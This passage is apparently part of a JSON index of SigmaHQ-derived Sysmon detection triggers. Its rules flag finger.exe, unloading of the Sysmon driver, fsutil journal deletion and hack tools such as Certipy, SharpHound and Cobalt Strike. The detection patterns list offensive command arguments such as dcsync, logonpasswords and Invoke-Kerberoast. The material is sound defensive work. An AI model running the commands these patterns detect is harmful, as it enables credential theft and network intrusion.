false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of \"findstr\" with the argument \"385201\". Which could indicate potential discovery of an installed Sysinternals Sysmon service using the default driver altitude (even if the name is changed).\n", "path": "scenarios/sigmahq/proc_creation_win_findstr_sysmon_discovery_via_default_altitude.yml", "version": "0.2", "versions": {"0.1": {"digest": "2f8f36c98c68f3114c609646b2660a690e7ed208946ace2f387fb7a77185a67a"}, "0.2": {"digest": "25183d0482bf1ea56ee4299bdf89d37058014a27928d06c221913021491f5dae"}}}, "sigmahq/proc_creation_win_finger_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_finger_execution\ndescription: |\n  Detects execution of the \"finger.exe\" utility. Finger.EXE or \"TCPIP Finger Command\" is an old utility that is still present on modern Windows installation. It Displays information about users on a specified remote computer (typically a UNIX computer) that is running the finger service or daemon. Due to the old nature of this utility and the rareness of machines having the finger service. Any execution of \"finger.exe\" can be considered \"suspicious\" and worth investigating. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.OriginalFileName == 'finger.exe' || evt.Parsed.Image endsWith '\\\\finger.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1105\n\n  label: \"Finger.EXE Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of the \"finger.exe\" utility. Finger.EXE or \"TCPIP Finger Command\" is an old utility that is still present on modern Windows installation. It Displays information about users on a specified remote computer (typically a UNIX computer) that is running the finger service or daemon. Due to the old nature of this utility and the rareness of machines having the finger service. Any execution of \"finger.exe\" can be considered \"suspicious\" and worth investigating. \n", "path": "scenarios/sigmahq/proc_creation_win_finger_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "80be7c1a244511e59dc0f58f62bf37672b16b1da849a876164a7bda76283d7c5"}, "0.2": {"digest": "b204652b5854f9f48a1b3aebc27fc556b446f551352cd0b3ff3ccd3aacd7306f"}}}, "sigmahq/proc_creation_win_fltmc_unload_driver_sysmon": {"content": "type: trigger\nname: sigmahq/proc_creation_win_fltmc_unload_driver_sysmon\ndescription: |\n  Detects possible Sysmon filter driver unloaded via fltmc.exe\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\fltMC.exe' || evt.Parsed.OriginalFileName == 'fltMC.exe') && evt.Parsed.CommandLine contains 'unload' && evt.Parsed.CommandLine contains 'sysmon')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1070\n   - attack.t1562\n   - attack.t1562.002\n\n  label: \"Sysmon Driver Unloaded Via Fltmc.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects possible Sysmon filter driver unloaded via fltmc.exe\n", "path": "scenarios/sigmahq/proc_creation_win_fltmc_unload_driver_sysmon.yml", "version": "0.2", "versions": {"0.1": {"digest": "aea1d39ee8e2bdff80de45ab9239fd4d756344b620b449795b3cee7bfd3fdcae"}, "0.2": {"digest": "d46c261c51ad7380cd99bc71bc3c66f5a3d92d8e27d23c5b1533a0e662c130bc"}}}, "sigmahq/proc_creation_win_forfiles_child_process_masquerading": {"content": "type: trigger\nname: sigmahq/proc_creation_win_forfiles_child_process_masquerading\ndescription: |\n  Detects the execution of \"forfiles\" from a non-default location, in order to potentially spawn a custom \"cmd.exe\" from the current working directory. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentCommandLine endsWith '.exe' || evt.Parsed.ParentCommandLine endsWith '.exe\"') && evt.Parsed.Image endsWith '\\\\cmd.exe' && evt.Parsed.CommandLine startsWith '/c echo \"' && not ((evt.Parsed.ParentImage contains ':\\\\Windows\\\\System32\\\\' || evt.Parsed.ParentImage contains ':\\\\Windows\\\\SysWOW64\\\\') && evt.Parsed.ParentImage endsWith '\\\\forfiles.exe' && (evt.Parsed.Image contains ':\\\\Windows\\\\System32\\\\' || evt.Parsed.Image contains ':\\\\Windows\\\\SysWOW64\\\\') && evt.Parsed.Image endsWith '\\\\cmd.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036\n\n  label: \"Forfiles.EXE Child Process Masquerading\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of \"forfiles\" from a non-default location, in order to potentially spawn a custom \"cmd.exe\" from the current working directory. \n", "path": "scenarios/sigmahq/proc_creation_win_forfiles_child_process_masquerading.yml", "version": "0.2", "versions": {"0.1": {"digest": "07475ec1fc0bced8c21efd13f3b9e99f5a990be02d655f7175b23975668a9b1c"}, "0.2": {"digest": "24015d2e0baf28386573ae5a494a5aba205b09e5019f7e342b45d6354c022013"}}}, "sigmahq/proc_creation_win_format_uncommon_filesystem_load": {"content": "type: trigger\nname: sigmahq/proc_creation_win_format_uncommon_filesystem_load\ndescription: |\n  Detects the execution of format.com with an uncommon filesystem selection that could indicate a defense evasion activity in which \"format.com\" is used to load malicious DLL files or other programs. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\format.com' && evt.Parsed.CommandLine contains '/fs:' && not (evt.Parsed.CommandLine contains '/fs:exFAT' || evt.Parsed.CommandLine contains '/fs:FAT' || evt.Parsed.CommandLine contains '/fs:NTFS' || evt.Parsed.CommandLine contains '/fs:ReFS' || evt.Parsed.CommandLine contains '/fs:UDF'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Uncommon FileSystem Load Attempt By Format.com\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of format.com with an uncommon filesystem selection that could indicate a defense evasion activity in which \"format.com\" is used to load malicious DLL files or other programs. \n", "path": "scenarios/sigmahq/proc_creation_win_format_uncommon_filesystem_load.yml", "version": "0.2", "versions": {"0.1": {"digest": "7bbe956838fe1a7da1002d176d177ed1e0be3bf9a0eaa4ab1fbac5ad0c23e0ec"}, "0.2": {"digest": "d403d840a078ac69b1e4c007c9178e767515c6b9913f0673994e6a0c3e24252a"}}}, "sigmahq/proc_creation_win_fsutil_usage": {"content": "type: trigger\nname: sigmahq/proc_creation_win_fsutil_usage\ndescription: |\n  Detects suspicious parameters of fsutil (deleting USN journal, configuring it with small size, etc). Might be used by ransomwares during the attack (seen by NotPetya and others). \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\fsutil.exe' || evt.Parsed.OriginalFileName == 'fsutil.exe') && (evt.Parsed.CommandLine contains 'deletejournal' || evt.Parsed.CommandLine contains 'createjournal' || evt.Parsed.CommandLine contains 'setZeroData'))\nblackhole: 2m\n#status: stable\nlabels:\n  service: windows\n  confidence: 2\n  spoofable: 0\n  classification:\n   - attack.t1070\n   - attack.t1485\n\n  label: \"Fsutil Suspicious Invocation\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious parameters of fsutil (deleting USN journal, configuring it with small size, etc). Might be used by ransomwares during the attack (seen by NotPetya and others). \n", "path": "scenarios/sigmahq/proc_creation_win_fsutil_usage.yml", "version": "0.2", "versions": {"0.1": {"digest": "0a81dbf0ec44545df98c511d916c8dd371001a1fb5b5e55addb1d8e3d8e25f2d"}, "0.2": {"digest": "4f6fa71315bafeb0146a69ee32f4a4c3b73795105451e9202d222ab30228b1e6"}}}, "sigmahq/proc_creation_win_googleupdate_susp_child_process": {"content": "type: trigger\nname: sigmahq/proc_creation_win_googleupdate_susp_child_process\ndescription: |\n  Detects potentially suspicious child processes of \"GoogleUpdate.exe\"\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\GoogleUpdate.exe' && not (evt.Parsed.Image contains '\\\\Google' || evt.Parsed.Image endsWith '\\\\setup.exe' || evt.Parsed.Image endsWith 'chrome_updater.exe' || evt.Parsed.Image endsWith 'chrome_installer.exe' || evt.Parsed.Image == ''))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Potentially Suspicious GoogleUpdate Child Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects potentially suspicious child processes of \"GoogleUpdate.exe\"\n", "path": "scenarios/sigmahq/proc_creation_win_googleupdate_susp_child_process.yml", "version": "0.2", "versions": {"0.1": {"digest": "ba767c21d49da83b6f44185350b06eddf9835d725188f6235d595deb80f077a2"}, "0.2": {"digest": "c8194766d743537742b47e1952e364d0a57b55c5f28e13fb212b8927515d8769"}}}, "sigmahq/proc_creation_win_gpg4win_susp_location": {"content": "type: trigger\nname: sigmahq/proc_creation_win_gpg4win_susp_location\ndescription: |\n  Detects usage of Gpg4win to encrypt/decrypt files located in potentially suspicious locations.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\gpg.exe' || evt.Parsed.Image endsWith '\\\\gpg2.exe' || evt.Parsed.Product == 'GNU Privacy Guard (GnuPG)' || evt.Parsed.Description == 'GnuPG\u2019s OpenPGP tool') && evt.Parsed.CommandLine contains '-passphrase' && (evt.Parsed.CommandLine contains ':\\\\PerfLogs\\\\' || evt.Parsed.CommandLine contains ':\\\\Temp\\\\' || evt.Parsed.CommandLine contains ':\\\\Users\\\\Public\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\Temp\\\\' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Local\\\\Temp\\\\' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Roaming\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"File Encryption/Decryption Via Gpg4win From Suspicious Locations\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of Gpg4win to encrypt/decrypt files located in potentially suspicious locations.\n", "path": "scenarios/sigmahq/proc_creation_win_gpg4win_susp_location.yml", "version": "0.2", "versions": {"0.1": {"digest": "cf50afc05d826b9e0e7fcda8d73c96e54341140e3561ca7fd3133f8e5736c8e9"}, "0.2": {"digest": "9fdfed99cf43bc718a78560683b4cffeff241fe1f9cb45c68c190faaa43eeb80"}}}, "sigmahq/proc_creation_win_gup_download": {"content": "type: trigger\nname: sigmahq/proc_creation_win_gup_download\ndescription: |\n  Detects execution of the Notepad++ updater (gup) from a process other than Notepad++ to download files.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\GUP.exe' || evt.Parsed.OriginalFileName == 'gup.exe') && evt.Parsed.CommandLine contains ' -unzipTo ' && evt.Parsed.CommandLine contains 'http' && not (evt.Parsed.ParentImage endsWith '\\\\notepad++.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1105\n\n  label: \"File Download Using Notepad++ GUP Utility\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of the Notepad++ updater (gup) from a process other than Notepad++ to download files.\n", "path": "scenarios/sigmahq/proc_creation_win_gup_download.yml", "version": "0.2", "versions": {"0.1": {"digest": "a681b66e76fbf45f66f2765a71ed94a77cc68307dfcc54e69aa03d5549d7ad77"}, "0.2": {"digest": "e60c2243e6c3bcbeac9c807c8052c1afcd2c6cb1f4bea80436e0dcd3f52306c3"}}}, "sigmahq/proc_creation_win_gup_suspicious_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_gup_suspicious_execution\ndescription: |\n  Detects execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\GUP.exe' && not (evt.Parsed.Image endsWith '\\\\Program Files\\\\Notepad++\\\\updater\\\\GUP.exe' || evt.Parsed.Image endsWith '\\\\Program Files (x86)\\\\Notepad++\\\\updater\\\\GUP.exe' || evt.Parsed.Image contains '\\\\Users\\\\' && (evt.Parsed.Image endsWith '\\\\AppData\\\\Local\\\\Notepad++\\\\updater\\\\GUP.exe' || evt.Parsed.Image endsWith '\\\\AppData\\\\Roaming\\\\Notepad++\\\\updater\\\\GUP.exe')))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1574.002\n\n  label: \"Suspicious GUP Usage\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks\n", "path": "scenarios/sigmahq/proc_creation_win_gup_suspicious_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "926f3b767a8b220e3744e1dde477da08d62c737a247e7f985308d18af99bc3be"}, "0.2": {"digest": "008c19c8df430fbec34ee551755fe5ea0f3f30b051da34d93a6178c4ffd66320"}}}, "sigmahq/proc_creation_win_hh_html_help_susp_child_process": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hh_html_help_susp_child_process\ndescription: |\n  Detects a suspicious child process of a Microsoft HTML Help (HH.exe)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\hh.exe' && (evt.Parsed.Image endsWith '\\\\CertReq.exe' || evt.Parsed.Image endsWith '\\\\CertUtil.exe' || evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\installutil.exe' || evt.Parsed.Image endsWith '\\\\MSbuild.exe' || evt.Parsed.Image endsWith '\\\\MSHTA.EXE' || evt.Parsed.Image endsWith '\\\\msiexec.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.Image endsWith '\\\\schtasks.exe' || evt.Parsed.Image endsWith '\\\\wmic.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1047\n   - attack.t1059.001\n   - attack.t1059.003\n   - attack.t1059.005\n   - attack.t1059.007\n   - attack.t1218\n   - attack.t1218.001\n   - attack.t1218.010\n   - attack.t1218.011\n   - attack.t1566\n   - attack.t1566.001\n\n  label: \"HTML Help HH.EXE Suspicious Child Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious child process of a Microsoft HTML Help (HH.exe)\n", "path": "scenarios/sigmahq/proc_creation_win_hh_html_help_susp_child_process.yml", "version": "0.2", "versions": {"0.1": {"digest": "08f60938f4bf778ee1aaa1467797a0c96b53f47eaebc631f39b9b3e08ea69e45"}, "0.2": {"digest": "cd53c68efcfa4a8af6e025aa99edab0177b4e5962b305bec0d3ea63577872a77"}}}, "sigmahq/proc_creation_win_hh_susp_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hh_susp_execution\ndescription: |\n  Detects a suspicious execution of a Microsoft HTML Help (HH.exe)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.OriginalFileName == 'HH.exe' || evt.Parsed.Image endsWith '\\\\hh.exe') && (evt.Parsed.CommandLine contains '.application' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Local\\\\Temp\\\\' || evt.Parsed.CommandLine contains '\\\\Content.Outlook\\\\' || evt.Parsed.CommandLine contains '\\\\Downloads\\\\' || evt.Parsed.CommandLine contains '\\\\Users\\\\Public\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\Temp\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1047\n   - attack.t1059.001\n   - attack.t1059.003\n   - attack.t1059.005\n   - attack.t1059.007\n   - attack.t1218\n   - attack.t1218.001\n   - attack.t1218.010\n   - attack.t1218.011\n   - attack.t1566\n   - attack.t1566.001\n\n  label: \"Suspicious HH.EXE Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious execution of a Microsoft HTML Help (HH.exe)\n", "path": "scenarios/sigmahq/proc_creation_win_hh_susp_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "4579149a34e69ef048e248218aef2f25f4052ce8c880d37db96102ca0772ed6f"}, "0.2": {"digest": "37fbc2af6da9f130fc825873312cf93af33182780c55df9778e60104cc1485c7"}}}, "sigmahq/proc_creation_win_hktl_adcspwn": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_adcspwn\ndescription: |\n  Detects command line parameters used by ADCSPwn, a tool to escalate privileges in an active directory network by coercing authenticate from machine accounts and relaying to the certificate service\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains ' --adcs ' && evt.Parsed.CommandLine contains ' --port ')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1557.001\n\n  label: \"HackTool - ADCSPwn Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects command line parameters used by ADCSPwn, a tool to escalate privileges in an active directory network by coercing authenticate from machine accounts and relaying to the certificate service\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_adcspwn.yml", "version": "0.2", "versions": {"0.1": {"digest": "0451785ffeef4903cd55b99e47fc2a69eeece333667fa34694d91e3a2a2bd521"}, "0.2": {"digest": "59cae3e6691f4e22489492cfc4667d63f46fbbaff3a7cb76fe3545e33b43817b"}}}, "sigmahq/proc_creation_win_hktl_bloodhound_sharphound": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_bloodhound_sharphound\ndescription: |\n  Detects command line parameters used by Bloodhound and Sharphound hack tools\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Product contains 'SharpHound' || evt.Parsed.Description contains 'SharpHound' || evt.Parsed.Company contains 'SpecterOps' || evt.Parsed.Company contains 'evil corp' || evt.Parsed.Image contains '\\\\Bloodhound.exe' || evt.Parsed.Image contains '\\\\SharpHound.exe' || evt.Parsed.CommandLine contains ' -CollectionMethod All ' || evt.Parsed.CommandLine contains ' --CollectionMethods Session ' || evt.Parsed.CommandLine contains ' --Loop --Loopduration ' || evt.Parsed.CommandLine contains ' --PortScanTimeout ' || evt.Parsed.CommandLine contains '.exe -c All -d ' || evt.Parsed.CommandLine contains 'Invoke-Bloodhound' || evt.Parsed.CommandLine contains 'Get-BloodHoundData' || evt.Parsed.CommandLine contains ' -JsonFolder ' && evt.Parsed.CommandLine contains ' -ZipFileName ' || evt.Parsed.CommandLine contains ' DCOnly ' && evt.Parsed.CommandLine contains ' --NoSaveCache ')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1087.001\n   - attack.t1087.002\n   - attack.t1482\n   - attack.t1069.001\n   - attack.t1069.002\n   - attack.t1059.001\n\n  label: \"HackTool - Bloodhound/Sharphound Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects command line parameters used by Bloodhound and Sharphound hack tools\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_bloodhound_sharphound.yml", "version": "0.2", "versions": {"0.1": {"digest": "f993dc26da8b0820bb4012d9661d0ae2504c0cdd3595af9d45328b3c71491f0c"}, "0.2": {"digest": "caabda88fa70c92a90b934714bf5ce7772608f78a99b9049fcd0d007c2eb824a"}}}, "sigmahq/proc_creation_win_hktl_c3_rundll32_pattern": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_c3_rundll32_pattern\ndescription: |\n  F-Secure C3 produces DLLs with a default exported StartNodeRelay function.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'rundll32.exe' && evt.Parsed.CommandLine contains '.dll' && evt.Parsed.CommandLine contains 'StartNodeRelay')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.011\n\n  label: \"HackTool - F-Secure C3 Load by Rundll32\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "F-Secure C3 produces DLLs with a default exported StartNodeRelay function.\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_c3_rundll32_pattern.yml", "version": "0.2", "versions": {"0.1": {"digest": "7979ffa89ca26e9426533538548f8aad835d3cf3742b63f83ef3375062adb993"}, "0.2": {"digest": "ea0bf26407ae2dc54326211759d6e27c76ac7045b4a0326fdf3f41265bbd95e9"}}}, "sigmahq/proc_creation_win_hktl_certify": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_certify\ndescription: |\n  Detects Certify a tool for Active Directory certificate abuse based on PE metadata characteristics and common command line arguments.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\Certify.exe' || evt.Parsed.OriginalFileName == 'Certify.exe' || evt.Parsed.Description contains 'Certify' || (evt.Parsed.CommandLine contains '.exe cas ' || evt.Parsed.CommandLine contains '.exe find ' || evt.Parsed.CommandLine contains '.exe pkiobjects ' || evt.Parsed.CommandLine contains '.exe request ' || evt.Parsed.CommandLine contains '.exe download ') && (evt.Parsed.CommandLine contains ' /vulnerable' || evt.Parsed.CommandLine contains ' /template:' || evt.Parsed.CommandLine contains ' /altname:' || evt.Parsed.CommandLine contains ' /domain:' || evt.Parsed.CommandLine contains ' /path:' || evt.Parsed.CommandLine contains ' /ca:'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1649\n\n  label: \"HackTool - Certify Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects Certify a tool for Active Directory certificate abuse based on PE metadata characteristics and common command line arguments.\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_certify.yml", "version": "0.2", "versions": {"0.1": {"digest": "2c208b4f30136afcc41eb027984ffa3e1860feefeb6908020e4a409023e82d1e"}, "0.2": {"digest": "61292e2cca80c307f2836e044d86b52c88718700dd45970eeabfcadda0795e02"}}}, "sigmahq/proc_creation_win_hktl_certipy": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_certipy\ndescription: |\n  Detects Certipy execution, a tool for Active Directory Certificate Services enumeration and abuse based on PE metadata characteristics and common command line arguments. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\Certipy.exe' || evt.Parsed.OriginalFileName == 'Certipy.exe' || evt.Parsed.Description contains 'Certipy' || (evt.Parsed.CommandLine contains ' account ' || evt.Parsed.CommandLine contains ' auth ' || evt.Parsed.CommandLine contains ' cert ' || evt.Parsed.CommandLine contains ' find ' || evt.Parsed.CommandLine contains ' forge ' || evt.Parsed.CommandLine contains ' ptt ' || evt.Parsed.CommandLine contains ' relay ' || evt.Parsed.CommandLine contains ' req ' || evt.Parsed.CommandLine contains ' shadow ' || evt.Parsed.CommandLine contains ' template ') && (evt.Parsed.CommandLine contains ' -bloodhound' || evt.Parsed.CommandLine contains ' -ca-pfx ' || evt.Parsed.CommandLine contains ' -dc-ip ' || evt.Parsed.CommandLine contains ' -kirbi' || evt.Parsed.CommandLine contains ' -old-bloodhound' || evt.Parsed.CommandLine contains ' -pfx ' || evt.Parsed.CommandLine contains ' -target' || evt.Parsed.CommandLine contains ' -template' || evt.Parsed.CommandLine contains ' -username ' || evt.Parsed.CommandLine contains ' -vulnerable' || evt.Parsed.CommandLine contains 'auth -pfx' || evt.Parsed.CommandLine contains 'shadow auto' || evt.Parsed.CommandLine contains 'shadow list'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1649\n\n  label: \"HackTool - Certipy Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects Certipy execution, a tool for Active Directory Certificate Services enumeration and abuse based on PE metadata characteristics and common command line arguments. \n", "path": "scenarios/sigmahq/proc_creation_win_hktl_certipy.yml", "version": "0.2", "versions": {"0.1": {"digest": "12e3791fae40dc6bb2f67065ab9289da4d285a810376bf8e31e17887bf40fb33"}, "0.2": {"digest": "fc897118a3954cc08312c3499e754b6b924ab9077d0c9d565e7b24835d58cea9"}}}, "sigmahq/proc_creation_win_hktl_cobaltstrike_bloopers_cmd": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_cobaltstrike_bloopers_cmd\ndescription: |\n  Detects use of Cobalt Strike commands accidentally entered in the CMD shell\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.OriginalFileName == 'Cmd.Exe' || evt.Parsed.Image endsWith '\\\\cmd.exe') && (evt.Parsed.CommandLine startsWith 'cmd ' || evt.Parsed.CommandLine startsWith 'cmd.exe' || evt.Parsed.CommandLine startsWith 'c:\\\\windows\\\\system32\\\\cmd.exe') && (evt.Parsed.CommandLine contains 'psinject' || evt.Parsed.CommandLine contains 'spawnas' || evt.Parsed.CommandLine contains 'make_token' || evt.Parsed.CommandLine contains 'remote-exec' || evt.Parsed.CommandLine contains 'rev2self' || evt.Parsed.CommandLine contains 'dcsync' || evt.Parsed.CommandLine contains 'logonpasswords' || evt.Parsed.CommandLine contains 'execute-assembly' || evt.Parsed.CommandLine contains 'getsystem'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.003\n\n  label: \"Operator Bloopers Cobalt Strike Commands\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects use of Cobalt Strike commands accidentally entered in the CMD shell\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_cobaltstrike_bloopers_cmd.yml", "version": "0.2", "versions": {"0.1": {"digest": "84cd50a86f833a30983f1ed4de40a92d4d8af1e742b4b585a124f4d78b8dc079"}, "0.2": {"digest": "a4a31809df717377cabd63607bab70a91b0308755f23897fac21f8ac5f81ae21"}}}, "sigmahq/proc_creation_win_hktl_cobaltstrike_bloopers_modules": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_cobaltstrike_bloopers_modules\ndescription: |\n  Detects Cobalt Strike module/commands accidentally entered in CMD shell\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.OriginalFileName == 'Cmd.Exe' || evt.Parsed.Image endsWith '\\\\cmd.exe') && (evt.Parsed.CommandLine contains 'Invoke-UserHunter' || evt.Parsed.CommandLine contains 'Invoke-ShareFinder' || evt.Parsed.CommandLine contains 'Invoke-Kerberoast' || evt.Parsed.CommandLine contains 'Invoke-SMBAutoBrute' || evt.Parsed.CommandLine contains 'Invoke-Nightmare' || evt.Parsed.CommandLine contains 'zerologon' || evt.Parsed.CommandLine contains 'av_query'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.003\n\n  label: \"Operator Bloopers Cobalt Strike Modules\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects Cobalt Strike module/commands accidentally entered in CMD shell\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_cobaltstrike_bloopers_modules.yml", "version": "0.2", "versions": {"0.1": {"digest": "1d00394564f99a0b8cadc06d01f72d7e4dd3ce489ac2badfc5c2c8c09daebd6a"}, "0.2": {"digest": "0cfc2c731b4b03479d96ae01266b48c346445d6b06b602570aa87692e71065d0"}}}, "sigmahq/proc_creation_win_hktl_cobaltstrike_load_by_rundll32": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_cobaltstrike_load_by_rundll32\ndescription: |\n  Rundll32 can be use by 